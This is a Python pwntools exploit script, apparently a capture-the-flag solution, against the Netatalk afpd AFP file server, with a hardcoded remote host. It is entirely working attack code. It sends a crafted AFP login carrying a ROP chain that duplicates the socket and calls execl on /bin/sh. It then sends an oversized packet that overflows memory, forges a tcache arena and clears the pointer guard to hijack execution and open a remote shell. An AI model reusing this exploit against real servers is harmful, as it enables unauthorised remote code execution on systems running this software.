#!/usr/bin/python
from pwn import *
import sys

from six import b

LOCAL = True

HOST = "18.181.73.12"
PORT = 4869
PROCESS = "./afpd"

DSIFUNC_CLOSE = 1
DSIFUNC_CMD = 2
DSIFUNC_STAT = 3
DSIFUNC_OPEN = 4
DSIFUNC_TICKLE = 5
DSIFUNC_WRITE = 6
DSIFUNC_ATTN = 8
DSIFUNC_MAX = 8

DSIOPT_ATTNQUANT = 1

AFP_LOGIN = 0x12
AFP_LOGINCONT = 0x13
AFP_LOGOUT = 0x14
AFP_LOGINEXT = 0x3f

def dsi_block(flags, command, requestID, doff, dsilen, reserved):
	block = p8(flags)
	block += p8(command)
	block += p16(requestID)
	block += p32(doff, endian="big")
	block += p32(dsilen, endian="big")
	block += p32(reserved)

	return block

def send_dsi_package(block_cmd, request_id, doff, dsilen, reserved, payload):
	package = dsi_block(0, block_cmd, request_id, doff, dsilen, reserved)
	package += payload

	r.send(package)

def exploit(r):	
	# solve pow if remote
	if not LOCAL:
		r.recvline()
		CMD = r.recvline()
		with open("pow.sh", "w") as f:
			f.write("#!/bin/sh\n")
			f.write(CMD)
		os.system("chmod +x pow.sh")
		poc = process("./pow.sh")
		poc.recvuntil("token: ")
		resp = poc.recvline()[:-1]
		r.sendline(resp)

	log.info("Open session")

	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	
	send_dsi_package(DSIFUNC_OPEN, 0x100, 0, len(cmd), 0, cmd)
	
	HEADER = r.recv(0x1c)

	log.info("Do valid login to prepare ropchain on bss")

	version = "AFP2.2"
	uams = "DHX"	

	rol = lambda val, r_bits, max_bits: \
		(val << r_bits%max_bits) & (2**max_bits-1) | \
		((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

	RET = 0x00000000004002e1

	SOCKET = 6

	POPRSI = 0x000000000040c2fc
	POPRDI = 0x00000000004096ab
	POPRDXRBX = 0x00000000004298c7
	SYSCALL = 0x000000000042245d

	user = "metatalk" + p64(0x0)
	user += p64(0x0000000000640000) + p64(0x0000000000640000)          # put valid address here for dl_signal
	user += p64(0x0) + p64(0)
	user += p64(0x0) + p64(0)
	user += p64(0x0) + p64(0)
	user += p64(rol(0x656800, 0x11, 64)) + p64(rol(RET, 0x11, 64))     # rsp / rdx
	
	# ropchain starts here	
	user += p64(POPRDI)
	user += p64(SOCKET)
	user += p64(POPRSI)
	user += p64(0)
	user += p64(e.plt["dup2"])	
	user += p64(POPRDI)
	user += p64(SOCKET)
	user += p64(POPRSI)
	user += p64(1)
	user += p64(e.plt["dup2"])
	user += p64(POPRDI)	
	user += p64(0x656890)
	user += p64(POPRSI)
	user += p64(0)
	user += p64(POPRDXRBX)
	user += p64(0)
	user += p64(0)
	user += p64(e.plt["execl"])

	user = user.ljust(0xf0, "\x00")
	user += "/bin/sh\x00"

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user

	send_dsi_package(DSIFUNC_CMD, 0x100, len(command), len(command), 0, command)

	log.info("Overflow package data")
	
	user = "metatalk"

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user
	command += "A"*(0x101000 - 0x10 - len(command))	
	command += cyclic_metasploit(4656)
	command += p64(0x63d300)							# fake empty tcache arena
	command += "A"*64
	command += p64(0x6567b0)							# bss pointer to not crash in dl_signal (from username)
	command += cyclic_metasploit(4736 - 8 - 4656 - 64 - 8)
	command += p64(0x644820)							# bss address for storing errno
	command += "A"*40
	command += p64(0x0)									# __pointer_chk_guard_local
	command += cyclic_metasploit(0x4000 - 4738 - 8 - 40 - 8)

	send_dsi_package(DSIFUNC_CMD, 0x100, len(command), len(command), 0, command)
	
	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./afpd")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		#r = process("./afpd")
		r = remote("localhost", 5566)		
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)